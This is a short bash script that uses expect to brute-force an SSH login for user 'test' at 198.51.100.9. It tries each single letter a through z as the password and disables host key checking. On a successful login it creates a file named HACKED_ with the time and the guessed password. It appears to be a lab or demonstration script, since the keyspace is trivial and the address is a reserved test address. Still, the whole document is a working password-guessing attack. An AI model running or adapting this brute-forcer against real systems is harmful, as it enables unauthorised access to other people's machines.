#!/bin/bash

for PASSWD in {a..z}; do    
    expect -c "
    spawn ssh test@198.51.100.9 -o "StrictHostKeyChecking=no" -o NumberOfPasswordPrompts=1 -t \"touch HACKED_`date +%H_%M_%S`_PASSWORD_$PASSWD\"
    expect {
        -re \"^Warning.*\" {exp_continue}
        -re \"^.*sword: \" {send \"$PASSWD\r\"; interact}
    }
    "
done    